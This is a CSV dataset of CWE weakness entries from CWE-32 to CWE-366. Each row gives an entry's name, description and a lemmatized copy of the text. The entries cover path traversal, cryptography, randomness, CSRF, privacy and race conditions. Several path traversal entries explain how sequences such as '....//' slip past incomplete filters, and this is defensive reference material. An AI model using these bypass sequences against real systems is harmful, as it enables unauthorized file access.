CWE-32,Path Traversal: '...' (Triple Dot),"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '...' (triple dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '...' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to ""..\.."" and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of ""./"" sequences, can ultimately produce valid "".."" sequences due to a collapse into unsafe value (CWE-182).",product use external input construct pathname restricted directory properly neutralize triple dot sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme windows system equivalent bypass check assume dot valid incomplete filtering removal sequence ultimately produce valid sequence collapse unsafe value
CWE-321,Use of Hard-coded Cryptographic Key,The use of a hard-coded cryptographic key significantly increases the possibility that encrypted data may be recovered.,use hard code cryptographic key significantly increase possibility encrypt datum recover
CWE-322,Key Exchange without Entity Authentication,"The product performs a key exchange with an actor without verifying the identity of that actor.Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable an attacker to impersonate an actor by modifying traffic between the two entities. Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc.",product perform key exchange actor verify identity actor perform key exchange preserve integrity information send entity guarantee entity claim enable attacker impersonate actor modify traffic entity typically involve victim client contact malicious server impersonate trusted server client skip authentication ignore authentication failure malicious server request authentication information user malicious server use authentication information log trusted server victim credential sniff traffic victim trusted server etc
CWE-323,"Reusing a Nonce, Key Pair in Encryption",Nonces should be used for the present occasion and only once.,nonce present occasion
CWE-324,Use of a Key Past its Expiration Date,"The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.While the expiration of keys does not necessarily ensure that they are compromised, it is a significant concern that keys which remain in use for prolonged periods of time have a decreasing probability of integrity. For this reason, it is important to replace keys within a period of time proportional to their strength.",product use cryptographic key password past expiration date diminish safety significantly increase timing window crack attack key expiration key necessarily ensure compromise significant concern key remain use prolonged period time decrease probability integrity reason important replace key period time proportional strength
CWE-325,Missing Cryptographic Step,"The product does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by the algorithm.",product implement require step cryptographic algorithm result weak encryption advertise algorithm
CWE-326,Inadequate Encryption Strength,"The product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.",product store transmit sensitive datum encryption scheme theoretically sound strong level protection require weak encryption scheme subject brute force attack reasonable chance succeed current attack method resource
CWE-327,Use of a Broken or Risky Cryptographic Algorithm,"The product uses a broken or risky cryptographic algorithm or protocol.Cryptographic algorithms are the methods by which data is scrambled to prevent observation or influence by unauthorized actors. Insecure cryptography can be exploited to expose sensitive information, modify data in unexpected ways, spoof identities of other users or devices, or other impacts.It is very difficult to produce a secure algorithm, and even high-profile algorithms by accomplished cryptographic experts have been broken. Well-known techniques exist to break or weaken various kinds of cryptography. Accordingly, there are a small number of well-understood and heavily studied algorithms that should be used by most products. Using a non-standard or known-insecure algorithm is dangerous because a determined adversary may be able to break the algorithm and compromise whatever data has been protected.Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered ""unsafe"" even if it was once thought to be strong. This can happen when new attacks are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.For a number of reasons, this weakness is even more challenging to manage with hardware deployment of cryptographic algorithms as opposed to software implementation. First, if a flaw is discovered with hardware-implemented cryptography, the flaw cannot be fixed in most cases without a recall of the product, because hardware is not easily replaceable like software. Second, because the hardware product is expected to work for years, the adversary's computing power will only increase over time.",product use broken risky cryptographic algorithm protocol cryptographic algorithm method data scramble prevent observation influence unauthorized actor insecure cryptography exploit expose sensitive information modify datum unexpected way spoof identity user device impact difficult produce secure algorithm high profile algorithm accomplished cryptographic expert break know technique exist break weaken kind cryptography accordingly small number understand heavily study algorithm product non standard know insecure algorithm dangerous determined adversary able break algorithm compromise datum protect state cryptography advance rapidly common algorithm consider unsafe think strong happen new attack discover compute power increase cryptographic algorithm long provide protection originally think number reason weakness challenging manage hardware deployment cryptographic algorithm oppose software implementation flaw discover hardware implement cryptography flaw fix case recall product hardware easily replaceable like software second hardware product expect work year adversary computing power increase time
CWE-328,Use of Weak Hash,"The product uses an algorithm that produces a digest (output value) that does not meet security expectations for a hash function that allows an adversary to reasonably determine the original input (preimage attack), find another input that can produce the same hash (2nd preimage attack), or find multiple inputs that evaluate to the same hash (birthday attack).A hash function is defined as an algorithm that maps arbitrarily sized data into a fixed-sized digest (output) such that the following properties hold:1. The algorithm is not invertible (also called ""one-way"" or ""not reversible"")2. The algorithm is deterministic; the same input produces the same digest every time Building on this definition, a cryptographic hash function must also ensure that a malicious actor cannot leverage the hash function to have a reasonable chance of success at determining any of the following:1. the original input (preimage attack), given only the digest2. another input that can produce the same digest (2nd preimage attack), given the original input3. a set of two or more inputs that evaluate to the same digest (birthday attack), given the actor can arbitrarily choose the inputs to be hashed and can do so a reasonable amount of timesWhat is regarded as ""reasonable"" varies by context and threat model, but in general, ""reasonable"" could cover any attack that is more efficient than brute force (i.e., on average, attempting half of all possible combinations). Note that some attacks might be more efficient than brute force but are still not regarded as achievable in the real world.Any algorithm does not meet the above conditions will generally be considered weak for general use in hashing.In addition to algorithmic weaknesses, a hash function can be made weak by using the hash in a security context that breaks its security guarantees. For example, using a hash function without a salt for storing passwords (that are sufficiently short) could enable an adversary to create a ""rainbow table"" [REF-637] to recover the password under certain conditions; this attack works against such hash functions as MD5, SHA-1, and SHA-2.",product use algorithm produce digest output value meet security expectation hash function allow adversary reasonably determine original input preimage attack find input produce hash preimage attack find multiple input evaluate hash birthday hash function define algorithm map arbitrarily sized datum fixed sized digest output following property algorithm invertible call way algorithm deterministic input produce digest time build definition cryptographic hash function ensure malicious actor leverage hash function reasonable chance success determine original input preimage attack give input produce digest preimage attack give original set input evaluate digest birthday attack give actor arbitrarily choose input hash reasonable timeswhat regard reasonable vary context threat model general reasonable cover attack efficient brute force average attempt half possible combination note attack efficient brute force regard achievable real world algorithm meet condition generally consider weak general use hashing addition algorithmic weakness hash function weak hash security context break security guarantee example hash function salt store password sufficiently short enable adversary create rainbow table recover password certain condition attack work hash function
CWE-329,Generation of Predictable IV with CBC Mode,"The product generates and uses a predictable initialization Vector (IV) with Cipher Block Chaining (CBC) Mode, which causes algorithms to be susceptible to dictionary attacks when they are encrypted under the same key.CBC mode eliminates a weakness of Electronic Code Book (ECB) mode by allowing identical plaintext blocks to be encrypted to different ciphertext blocks. This is possible by the XOR-ing of an IV with the initial plaintext block so that every plaintext block in the chain is XOR'd with a different value before encryption. If IVs are reused, then identical plaintexts would be encrypted to identical ciphertexts. However, even if IVs are not identical but are predictable, then they still break the security of CBC mode against Chosen Plaintext Attacks (CPA).",product generate use predictable initialization vector iv cipher block chaining cbc mode cause algorithm susceptible dictionary attack encrypt key cbc mode eliminate weakness electronic code book ecb mode allow identical plaintext block encrypt different ciphertext block possible xor ing iv initial plaintext block plaintext block chain different value encryption iv reuse identical plaintext encrypt identical ciphertext iv identical predictable break security cbc mode choose plaintext attacks cpa
CWE-33,Path Traversal: '....' (Multiple Dot),"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....' (multiple dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '....' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to ""..\..\.."" and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of ""./"" sequences, can ultimately produce valid "".."" sequences due to a collapse into unsafe value (CWE-182).",product use external input construct pathname restricted directory properly neutralize multiple dot sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme windows system equivalent bypass check assume dot valid incomplete filtering removal sequence ultimately produce valid sequence collapse unsafe value
CWE-330,Use of Insufficiently Random Values,"The product uses insufficiently random numbers or values in a security context that depends on unpredictable numbers.When product generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.",product use insufficiently random number value security context depend unpredictable number product generate predictable value context require unpredictability possible attacker guess value generate use guess impersonate user access sensitive information
CWE-331,Insufficient Entropy,"The product uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others.",product use algorithm scheme produce insufficient entropy leave pattern cluster value likely occur
CWE-332,Insufficient Entropy in PRNG,"The lack of entropy available for, or used by, a Pseudo-Random Number Generator (PRNG) can be a stability and security threat.",lack entropy available pseudo random number generator prng stability security threat
CWE-333,Improper Handling of Insufficient Entropy in TRNG,True random number generators (TRNG) generally have a limited source of entropy and therefore can fail or block.The rate at which true random numbers can be generated is limited. It is important that one uses them only when they are needed for security.,true random number generator trng generally limited source entropy fail block rate true random number generate limited important use need security
CWE-334,Small Space of Random Values,"The number of possible random values is smaller than needed by the product, making it more susceptible to brute force attacks.",number possible random value small need product make susceptible brute force attack
CWE-335,Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG),"The product uses a Pseudo-Random Number Generator (PRNG) but does not correctly manage seeds.PRNGs are deterministic and, while their output appears random, they cannot actually create entropy. They rely on cryptographically secure and unique seeds for entropy so proper seeding is critical to the secure operation of the PRNG. Management of seeds could be broken down into two main areas: (1) protecting seeds as cryptographic material (such as a cryptographic key); (2) whenever possible, using a uniquely generated seed from a cryptographically secure source PRNGs require a seed as input to generate a stream of numbers that are functionally indistinguishable from random numbers. While the output is, in many cases, sufficient for cryptographic uses, the output of any PRNG is directly determined by the seed provided as input. If the seed can be ascertained by a third party, the entire output of the PRNG can be made known to them. As such, the seed should be kept secret and should ideally not be able to be guessed. For example, the current time may be a poor seed. Knowing the approximate time the PRNG was seeded greatly reduces the possible key space. Seeds do not necessarily need to be unique, but reusing seeds may open up attacks if the seed is discovered.",product use pseudo random number generator prng correctly manage seed prngs deterministic output appear random actually create entropy rely cryptographically secure unique seed entropy proper seeding critical secure operation prng management seed break main area protect seed cryptographic material cryptographic key possible uniquely generate seed cryptographically secure source prngs require seed input generate stream number functionally indistinguishable random number output case sufficient cryptographic use output prng directly determine seed provide input seed ascertain party entire output prng known seed keep secret ideally able guess example current time poor seed know approximate time prng seed greatly reduce possible key space seed necessarily need unique reuse seed open attack seed discover
CWE-336,Same Seed in Pseudo-Random Number Generator (PRNG),"A Pseudo-Random Number Generator (PRNG) uses the same seed each time the product is initialized.Given the deterministic nature of PRNGs, using the same seed for each initialization will lead to the same output in the same order. If an attacker can guess (or knows) the seed, then the attacker may be able to determine the random numbers that will be produced from the PRNG.",pseudo random number generator prng use seed time product initialize give deterministic nature prng seed initialization lead output order attacker guess know seed attacker able determine random number produce prng
CWE-337,Predictable Seed in Pseudo-Random Number Generator (PRNG),"A Pseudo-Random Number Generator (PRNG) is initialized from a predictable seed, such as the process ID or system time.The use of predictable seeds significantly reduces the number of possible seeds that an attacker would need to test in order to predict which random numbers will be generated by the PRNG.",pseudo random number generator prng initialize predictable seed process id system time use predictable seed significantly reduce number possible seed attacker need test order predict random number generate prng
CWE-338,Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG),"The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks.Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography.",product use pseudo random number generator prng security context prng algorithm cryptographically strong non cryptographic prng cryptographic context expose cryptography certain type attack pseudo random number generator prng design cryptography mediocre source randomness sufficient preferable algorithm use random number weak generator generally processing power use precious finite entropy source system prngs useful feature feature break cryptography
CWE-339,Small Seed Space in PRNG,"A Pseudo-Random Number Generator (PRNG) uses a relatively small seed space, which makes it more susceptible to brute force attacks.PRNGs are entirely deterministic once seeded, so it should be extremely difficult to guess the seed. If an attacker can collect the outputs of a PRNG and then brute force the seed by trying every possibility to see which seed matches the observed output, then the attacker will know the output of any subsequent calls to the PRNG. A small seed space implies that the attacker will have far fewer possible values to try to exhaust all possibilities.",pseudo random number generator prng use relatively small seed space make susceptible brute force attack prngs entirely deterministic seed extremely difficult guess seed attacker collect output prng brute force seed try possibility seed match observe output attacker know output subsequent call prng small seed space imply attacker far few possible value try exhaust possibility
CWE-34,Path Traversal: '....//',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....//' (doubled dot dot slash) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '....//' manipulation is useful for bypassing some path traversal protection schemes. If ""../"" is filtered in a sequential fashion, as done by some regular expression engines, then ""....//"" can collapse into the ""../"" unsafe value (CWE-182). It could also be useful when "".."" is removed, if the operating system treats ""//"" and ""/"" as equivalent.",product use external input construct pathname restricted directory properly neutralize double dot dot slash sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme filter sequential fashion regular expression engine collapse unsafe value useful remove operate system treat equivalent
CWE-340,Generation of Predictable Numbers or Identifiers,The product uses a scheme that generates numbers or identifiers that are more predictable than required.,product use scheme generate number identifier predictable require
CWE-341,Predictable from Observable State,"A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc.",number object predictable base observation attacker state system network time process id etc
CWE-342,Predictable Exact Value from Previous Values,An exact value or random number can be precisely predicted by observing previous values.,exact value random number precisely predict observe previous value
CWE-343,Predictable Value Range from Previous Values,"The product's random number generator produces a series of values which, when observed, can be used to infer a relatively small range of possibilities for the next value that could be generated.The output of a random number generator should not be predictable based on observations of previous values. In some cases, an attacker cannot predict the exact value that will be produced next, but can narrow down the possibilities significantly. This reduces the amount of effort to perform a brute force attack. For example, suppose the product generates random numbers between 1 and 100, but it always produces a larger value until it reaches 100. If the generator produces an 80, then the attacker knows that the next value will be somewhere between 81 and 100. Instead of 100 possibilities, the attacker only needs to consider 20.",product random number generator produce series value observe infer relatively small range possibility value generate output random number generator predictable base observation previous value case attacker predict exact value produce narrow possibility significantly reduce effort perform brute force attack example suppose product generate random number produce large value reach generator produce attacker know value instead possibility attacker need consider
CWE-344,Use of Invariant Value in Dynamically Changing Context,"The product uses a constant value, name, or reference, but this value can (or should) vary across different environments.",product use constant value reference value vary different environment
CWE-345,Insufficient Verification of Data Authenticity,"The product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.",product sufficiently verify origin authenticity datum way cause accept invalid datum
CWE-346,Origin Validation Error,The product does not properly verify that the source of data or communication is valid.,product properly verify source datum communication valid
CWE-347,Improper Verification of Cryptographic Signature,"The product does not verify, or incorrectly verifies, the cryptographic signature for data.",product verify incorrectly verify cryptographic signature datum
CWE-348,Use of Less Trusted Source,"The product has two different sources of the same data or information, but it uses the source that has less support for verification, is less trusted, or is less resistant to attack.",product different source datum information use source support verification trusted resistant attack
CWE-349,Acceptance of Extraneous Untrusted Data With Trusted Data,"The product, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted.",product process trusted datum accept untrusted datum include trust datum treat untrusted datum trust
CWE-35,Path Traversal: '.../...//',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '.../...//' manipulation is useful for bypassing some path traversal protection schemes. If ""../"" is filtered in a sequential fashion, as done by some regular expression engines, then "".../...//"" can collapse into the ""../"" unsafe value (CWE-182). Removing the first ""../"" yields ""....//""; the second removal yields ""../"". Depending on the algorithm, the product could be susceptible to CWE-34 but not CWE-35, or vice versa.",product use external input construct pathname restricted directory properly neutralize double triple dot slash sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation useful bypass path traversal protection scheme filter sequential fashion regular expression engine collapse unsafe value remove yield second removal yield depend algorithm product susceptible vice versa
CWE-350,Reliance on Reverse DNS Resolution for a Security-Critical Action,"The product performs reverse DNS resolution on an IP address to obtain the hostname and make a security decision, but it does not properly ensure that the IP address is truly associated with the hostname.Since DNS names can be easily spoofed or misreported, and it may be difficult for the product to detect if a trusted DNS server has been compromised, DNS names do not constitute a valid authentication mechanism.When the product performs a reverse DNS resolution for an IP address, if an attacker controls the DNS server for that IP address, then the attacker can cause the server to return an arbitrary hostname. As a result, the attacker may be able to bypass authentication, cause the wrong hostname to be recorded in log files to hide activities, or perform other attacks.Attackers can spoof DNS names by either (1) compromising a DNS server and modifying its records (sometimes called DNS cache poisoning), or (2) having legitimate control over a DNS server associated with their IP address.",product perform reverse dns resolution ip address obtain hostname security decision properly ensure ip address truly associate hostname dns name easily spoof misreporte difficult product detect trust dns server compromise dns name constitute valid authentication mechanism product perform reverse dns resolution ip address attacker control dns server ip address attacker cause server return arbitrary hostname result attacker able bypass authentication cause wrong hostname record log file hide activity perform attack attacker spoof dns name compromise dns server modify record call dns cache poisoning have legitimate control dns server associate ip address
CWE-351,Insufficient Type Distinction,The product does not properly distinguish between different types of elements in a way that leads to insecure behavior.,product properly distinguish different type element way lead insecure behavior
CWE-352,Cross-Site Request Forgery (CSRF),"The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.",web application sufficiently verify form valid consistent request intentionally provide user submit request web server design receive request client mechanism verify intentionally send possible attacker trick client make unintentional request web server treat authentic request url image load xmlhttprequest etc result exposure datum unintended code execution
CWE-353,Missing Support for Integrity Check,"The product uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.If integrity check values or ""checksums"" are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets.",product use transmission protocol include mechanism verify integrity datum transmission checksum integrity check value checksum omit protocol way determine datum corrupt transmission lack checksum functionality protocol remove application level check datum end end philosophy check state integrity check perform low level completely implement exclude sanity check input validation perform application protocol checksum important level checksum perform completely previous level take account entire message oppose single packet
CWE-354,Improper Validation of Integrity Check Value,"The product does not validate or incorrectly validates the integrity check values or ""checksums"" of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission.Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.",product validate incorrectly validate integrity check value checksum message prevent detect datum modify corrupt transmission improper validation checksum use result unnecessary risk easily mitigate protocol specification describe algorithm calculate checksum simple matter implement calculation verify calculate checksum receive checksum match improper verification calculate checksum receive checksum lead far great consequence
CWE-356,Product UI does not Warn User of Unsafe Actions,"The product's user interface does not warn the user before undertaking an unsafe action on behalf of that user. This makes it easier for attackers to trick users into inflicting damage to their system.Product systems should warn users that a potentially dangerous action may occur if the user proceeds. For example, if the user downloads a file from an unknown source and attempts to execute the file on their machine, then the application's GUI can indicate that the file is unsafe.",product user interface warn user undertake unsafe action behalf user make easy attacker trick user inflict damage system product system warn user potentially dangerous action occur user proceed example user download file unknown source attempt execute file machine application gui indicate file unsafe
CWE-357,Insufficient UI Warning of Dangerous Operations,"The user interface provides a warning to a user regarding dangerous or sensitive operations, but the warning is not noticeable enough to warrant attention.",user interface provide warning user dangerous sensitive operation warning noticeable warrant attention
CWE-358,Improperly Implemented Security Check for Standard,"The product does not implement or incorrectly implements one or more security-relevant checks as specified by the design of a standardized algorithm, protocol, or technique.",product implement incorrectly implement security relevant check specify design standardized algorithm protocol technique
CWE-359,Exposure of Private Personal Information to an Unauthorized Actor,"The product does not properly prevent a person's private, personal information from being accessed by actors who either (1) are not explicitly authorized to access the information or (2) do not have the implicit consent of the person about whom the information is collected.There are many types of sensitive information that products must protect from attackers, including system data, communications, configuration, business secrets, intellectual property, and an individual's personal (private) information. Private personal information may include a password, phone number, geographic location, personal messages, credit card number, etc. Private information is important to consider whether the person is a user of the product, or part of a data set that is processed by the product. An exposure of private information does not necessarily prevent the product from working properly, and in fact the exposure might be intended by the developer, e.g. as part of data sharing with other organizations. However, the exposure of personal private information can still be undesirable or explicitly prohibited by law or regulation.Some types of private information include:Government identifiers, such as Social Security NumbersContact information, such as home addresses and telephone numbersGeographic location - where the user is (or was)Employment historyFinancial data - such as credit card numbers, salary, bank accounts, and debtsPictures, video, or audioBehavioral patterns - such as web surfing history, when certain activities are performed, etc.Relationships (and types of relationships) with others - family, friends, contacts, etc.Communications - e-mail addresses, private messages, text messages, chat logs, etc.Health - medical conditions, insurance status, prescription recordsAccount passwords and other credentialsSome of this information may be characterized as PII (Personally Identifiable Information), Protected Health Information (PHI), etc. Categories of private information may overlap or vary based on the intended usage or the policies and practices of a particular industry.Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.",product properly prevent person private personal information access actor explicitly authorize access information implicit consent person information collect type sensitive information product protect attacker include system datum communication configuration business secret intellectual property individual personal private information private personal information include password phone number geographic location personal message credit card number etc private information important consider person user product data set process product exposure private information necessarily prevent product work properly fact exposure intend developer datum sharing organization exposure personal private information undesirable explicitly prohibit law regulation type private information include government identifier social security numberscontact information home address telephone numbersgeographic location user historyfinancial datum credit card number salary bank account debtspicture video audiobehavioral pattern web surfing history certain activity perform etc relationship type relationship family friend contact etc communication e mail address private message text message chat log etc health medical condition insurance status prescription recordsaccount password credentialssome information characterize pii personally identifiable information protected health information phi etc category private information overlap vary base intend usage policy practice particular industry datum label private privacy implication different context example student identification number usually consider private explicit publicly available mapping individual student personal information school generate identification number base student social security number identification number consider private
CWE-36,Absolute Path Traversal,"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize absolute path sequences such as ""/abs/path"" that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.",product use external input construct pathname restricted directory properly neutralize absolute path sequence path resolve location outside directory allow attacker traverse file system access file directory outside restricted directory
CWE-360,Trust of System Event Data,"Security based on event locations are insecure and can be spoofed.Events are a messaging system which may provide control data to programs listening for events. Events often do not have any type of authentication framework to allow them to be verified from a trusted source. Any application, in Windows, on a given desktop can send a message to any window on the same desktop. There is no authentication framework for these messages. Therefore, any message can be used to manipulate any process on the desktop if the process does not check the validity and safeness of those messages.",security base event location insecure spoof event messaging system provide control datum program listen event event type authentication framework allow verify trust source application windows give desktop send message window desktop authentication framework message message manipulate process desktop process check validity safeness message
CWE-362,Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'),"The product contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.This can have security implications when the expected synchronization is in security-critical code, such as recording whether a user is authenticated or modifying important state information that should not be influenced by an outsider.A race condition occurs within concurrent environments, and is effectively a property of a code sequence. Depending on the context, a code sequence may be in the form of a function call, a small number of instructions, a series of program invocations, etc.A race condition violates these properties, which are closely related:Exclusivity - the code sequence is given exclusive access to the shared resource, i.e., no other code sequence can modify properties of the shared resource before the original sequence has completed execution.Atomicity - the code sequence is behaviorally atomic, i.e., no other thread or process can concurrently execute the same sequence of instructions (or a subset) against the same resource.A race condition exists when an ""interfering code sequence"" can still access the shared resource, violating exclusivity. Programmers may assume that certain code sequences execute too quickly to be affected by an interfering code sequence; when they are not, this violates atomicity. For example, the single ""x++"" statement may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read (the original value of x), followed by a computation (x+1), followed by a write (save the result to x).The interfering code sequence could be ""trusted"" or ""untrusted."" A trusted interfering code sequence occurs within the product; it cannot be modified by the attacker, and it can only be invoked indirectly. An untrusted interfering code sequence can be authored directly by the attacker, and typically it is external to the vulnerable product.",product contain code sequence run concurrently code code sequence require temporary exclusive access share resource timing window exist share resource modify code sequence operate concurrently security implication expect synchronization security critical code record user authenticate modify important state information influence outsider race condition occur concurrent environment effectively property code sequence depend context code sequence form function small number instruction series program invocation etc race condition violate property closely related exclusivity code sequence give exclusive access share resource code sequence modify property share resource original sequence complete execution atomicity code sequence behaviorally atomic thread process concurrently execute sequence instruction subset resource race condition exist interfere code sequence access share resource violate exclusivity programmer assume certain code sequence execute quickly affect interfere code sequence violate atomicity example single statement appear atomic code layer actually non atomic instruction layer involve read original value x follow computation follow write save result interfere code sequence trust untruste trusted interfere code sequence occur product modify attacker invoke indirectly untrusted interfere code sequence author directly attacker typically external vulnerable product
CWE-363,Race Condition Enabling Link Following,"The product checks the status of a file or directory before accessing it, which produces a race condition in which the file can be replaced with a link before the access is performed, causing the product to access the wrong file.While developers might expect that there is a very narrow time window between the time of check and time of use, there is still a race condition. An attacker could cause the product to slow down (e.g. with memory consumption), causing the time window to become larger. Alternately, in some situations, the attacker could win the race by performing a large number of attacks.",product check status file directory access produce race condition file replace link access perform cause product access wrong file developer expect narrow time window time check time use race condition attacker cause product slow memory consumption cause time window large alternately situation attacker win race perform large number attack
CWE-364,Signal Handler Race Condition,"The product uses a signal handler that introduces a race condition.Race conditions frequently occur in signal handlers, since signal handlers support asynchronous actions. These race conditions have a variety of root causes and symptoms. Attackers may be able to exploit a signal handler race condition to cause the product state to be corrupted, possibly leading to a denial of service or even code execution.These issues occur when non-reentrant functions, or state-sensitive actions occur in the signal handler, where they may be called at any time. These behaviors can violate assumptions being made by the ""regular"" code that is interrupted, or by other signal handlers that may also be invoked. If these functions are called at an inopportune moment - such as while a non-reentrant function is already running - memory corruption could occur that may be exploitable for code execution. Another signal race condition commonly found occurs when free is called within a signal handler, resulting in a double free and therefore a write-what-where condition. Even if a given pointer is set to NULL after it has been freed, a race condition still exists between the time the memory was freed and the pointer was set to NULL. This is especially problematic if the same signal handler has been set for more than one signal -- since it means that the signal handler itself may be reentered.There are several known behaviors related to signal handlers that have received the label of ""signal handler race condition"":Shared state (e.g. global data or static variables) that are accessible to both a signal handler and ""regular"" codeShared state between a signal handler and other signal handlersUse of non-reentrant functionality within a signal handler - which generally implies that shared state is being used. For example, malloc() and free() are non-reentrant because they may use global or static data structures for managing memory, and they are indirectly used by innocent-seeming functions such as syslog(); these functions could be exploited for memory corruption and, possibly, code execution.Association of the same signal handler function with multiple signals - which might imply shared state, since the same code and resources are accessed. For example, this can be a source of double-free and use-after-free weaknesses.Use of setjmp and longjmp, or other mechanisms that prevent a signal handler from returning control back to the original functionalityWhile not technically a race condition, some signal handlers are designed to be called at most once, and being called more than once can introduce security problems, even when there are not any concurrent calls to the signal handler. This can be a source of double-free and use-after-free weaknesses.Signal handler vulnerabilities are often classified based on the absence of a specific protection mechanism, although this style of classification is discouraged in CWE because programmers often have a choice of several different mechanisms for addressing the weakness. Such protection mechanisms may preserve exclusivity of access to the shared resource, and behavioral atomicity for the relevant code:Avoiding shared stateUsing synchronization in the signal handlerUsing synchronization in the regular codeDisabling or masking other signals, which provides atomicity (which effectively ensures exclusivity)",product use signal handler introduce race condition race condition frequently occur signal handler signal handler support asynchronous action race condition variety root cause symptom attacker able exploit signal handler race condition cause product state corrupt possibly lead denial service code execution issue occur non reentrant function state sensitive action occur signal handler call time behavior violate assumption regular code interrupt signal handler invoke function call inopportune moment non reentrant function run memory corruption occur exploitable code execution signal race condition commonly find occur free call signal handler result double free write condition give pointer set null free race condition exist time memory free pointer set null especially problematic signal handler set signal mean signal handler reentere know behavior relate signal handler receive label signal handler race state global datum static variable accessible signal handler regular codeshare state signal handler signal handlersuse non reentrant functionality signal handler generally imply share state example malloc free non reentrant use global static data structure manage memory indirectly innocent function syslog function exploit memory corruption possibly code execution association signal handler function multiple signal imply share state code resource access example source double free use free weakness use setjmp longjmp mechanism prevent signal handler return control original functionalitywhile technically race condition signal handler design call call introduce security problem concurrent call signal handler source double free use free weakness signal handler vulnerability classify base absence specific protection mechanism style classification discourage cwe programmer choice different mechanism address weakness protection mechanism preserve exclusivity access share resource behavioral atomicity relevant code avoid share stateusing synchronization signal handlerusing synchronization regular codedisable mask signal provide atomicity effectively ensure exclusivity
CWE-365,DEPRECATED: Race Condition in Switch,"This entry has been deprecated. There are no documented cases in which a switch's control expression is evaluated more than once.It is likely that this entry was initially created based on a misinterpretation of the original source material. The original source intended to explain how switches could be unpredictable when using threads, if the control expressions used data or variables that could change between execution of different threads. That weakness is already covered by CWE-367. Despite the ambiguity in the documentation for some languages and compilers, in practice, they all evaluate the switch control expression only once. If future languages state that the code explicitly evaluates the control expression more than once, then this would not be a weakness, but the language performing as designed.",entry deprecate document case switch control expression evaluate likely entry initially create base misinterpretation original source material original source intend explain switch unpredictable thread control expression datum variable change execution different thread weakness cover despite ambiguity documentation language compiler practice evaluate switch control expression future language state code explicitly evaluate control expression weakness language perform design
CWE-366,Race Condition within a Thread,"If two threads of execution use a resource simultaneously, there exists the possibility that resources may be used while invalid, in turn making the state of execution undefined.",thread execution use resource simultaneously exist possibility resource invalid turn make state execution undefined
